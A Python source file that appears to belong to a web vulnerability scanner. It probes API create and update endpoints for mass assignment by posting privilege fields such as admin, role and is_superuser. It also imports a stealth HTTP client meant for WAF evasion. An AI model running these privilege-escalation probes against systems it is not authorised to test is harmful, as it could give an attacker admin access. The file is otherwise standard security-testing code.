#!/usr/bin/env python3
"""Mass Assignment Tester

Tests for mass assignment vulnerabilities:
- Mass assignment of object properties
- Privilege escalation via mass assignment
- Sensitive field manipulation (admin, role, etc.)
"""

import os
from typing import Dict, Any, Optional, List
from urllib.parse import urlparse

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)



def test_mass_assignment(
    target_url: str,
    endpoint: str,
    object_schema: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """Test for mass assignment vulnerabilities
    
    Args:
        target_url: Target URL
        endpoint: API endpoint with object creation/update
        object_schema: Optional object schema
        
    Returns:
        Dict with test results
    """
    result = {
        "type": "mass_assignment",
        "test": "mass_assignment",
        "vulnerable": False,
        "url": target_url,
        "endpoint": endpoint,
        "manipulated_fields": [],
        "privilege_escalation": False,
        "evidence": None
    }
    
    # Common sensitive fields to test
    sensitive_fields = {
        "admin": True,
        "is_admin": True,
        "role": "admin",
        "roles": ["admin"],
        "permissions": ["all"],
        "is_staff": True,
        "is_superuser": True,
        "privilege": "admin",
        "access_level": "admin",
    }
    
    # Build test payload with sensitive fields
    test_payload = sensitive_fields.copy()
    if object_schema:
        # Add normal fields from schema
        for key, value in object_schema.items():
            if key not in test_payload:
                test_payload[key] = value
    
    try:
        # Try POST to create object with sensitive fields
        resp = safe_post(
            endpoint,
            json=test_payload,
            timeout=10
        )
        
        # Check if request succeeded
        if resp.status_code in [200, 201]:
            # Check response for privilege escalation indicators
            response_lower = resp.text.lower()
            privilege_indicators = ["admin", "role", "permission", "privilege"]
            
            if any(ind in response_lower for ind in privilege_indicators):
                result["vulnerable"] = True
                result["manipulated_fields"] = list(sensitive_fields.keys())
                result["privilege_escalation"] = True
                result["evidence"] = {
                    "payload": test_payload,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500],
                    "note": "Mass assignment privilege escalation detected"
                }
        
    except Exception as e:
        result["evidence"] = {"error": str(e)}
    
    return result


def validate_mass_assignment(
    discovery_data: Dict[str, Any]
) -> Dict[str, Any]:
    """Main validation function for mass assignment
    
    Args:
        discovery_data: Discovery data containing endpoints
        
    Returns:
        Dict with validation results
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # Get endpoints from discovery data
    endpoints = []
    if "api_endpoints" in discovery_data:
        endpoints = discovery_data["api_endpoints"]
    elif "web" in discovery_data and "api_endpoints" in discovery_data["web"]:
        endpoints = discovery_data["web"]["api_endpoints"]
    
    # Filter for object creation/update endpoints
    object_endpoints = [
        ep for ep in endpoints
        if ep.get("method", "").upper() in ["POST", "PUT", "PATCH"]
        and any(kw in ep.get("url", "").lower() for kw in ["create", "update", "user", "profile", "account"])
    ]
    
    # Test each endpoint
    for endpoint_info in object_endpoints:
        endpoint_url = endpoint_info.get("url")
        if not endpoint_url:
            continue
        
        test_result = test_mass_assignment(
            discovery_data.get("target", ""),
            endpoint_url
        )
        results["tests_run"] += 1
        if test_result["vulnerable"]:
            results["vulnerable"] = True
            results["findings"].append(test_result)
    
    return results


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="Mass Assignment Tester")
    ap.add_argument("--target", required=True, help="Target URL")
    ap.add_argument("--endpoint", required=True, help="Endpoint to test")
    args = ap.parse_args()
    
    result = test_mass_assignment(args.target, args.endpoint)
    
    import json
    print(json.dumps(result, indent=2))

